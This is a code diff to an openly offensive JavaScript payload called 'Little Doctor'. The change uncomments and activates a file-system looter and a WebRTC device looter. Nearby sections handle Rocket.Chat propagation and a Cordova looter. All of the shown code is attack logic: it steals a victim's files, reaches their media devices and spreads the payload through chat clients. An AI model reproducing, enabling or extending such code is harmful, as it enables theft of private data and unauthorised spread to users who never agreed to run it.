@@ -43,19 +43,19 @@ function __ld_main() {
     console.log('Little Doctor is examining the patient ...');
             
     // FileSystem Looter
-    // requirejs(['filesystem', 'platform'], function(fs, platform) {
-    //     fs.isFileSystemAccessbile({
-    //         success: function() {
-    //             console.log('FileSystem appears to be accessible, loading looter ...');
-    //             requirejs(['lootFiles'], function(lootFiles) {
-    //                 lootFiles.execute();
-    //             });
-    //         },
-    //         failure: function() {
-    //             console.log('FileSystem does not appear to be accessible');
-    //         }
-    //     });
-    // });
+    requirejs(['filesystem', 'platform'], function(fs, platform) {
+        fs.isFileSystemAccessbile({
+            success: function() {
+                console.log('FileSystem appears to be accessible, loading looter ...');
+                requirejs(['lootFiles'], function(lootFiles) {
+                    lootFiles.execute();
+                });
+            },
+            failure: function() {
+                console.log('FileSystem does not appear to be accessible');
+            }
+        });
+    });
 
     // RocketChat Propagation
     if (navigator.userAgent.indexOf("Rocket.Chat") > -1) {
@@ -67,12 +67,12 @@ function __ld_main() {
     }
 
     // WebRTC Looter
-    // if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
-    //     console.log('WebRTC looks to be accessible');
-    //     requirejs(['lootWebRtc'], function(webrtc) {
-    //         webrtc.execute();
-    //     });
-    // }
+    if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
+        console.log('WebRTC looks to be accessible');
+        requirejs(['lootWebRtc'], function(webrtc) {
+            webrtc.execute();
+        });
+    }
 
     // Cordova Looter
     if (navigator.device && navigator.device.cordova) {
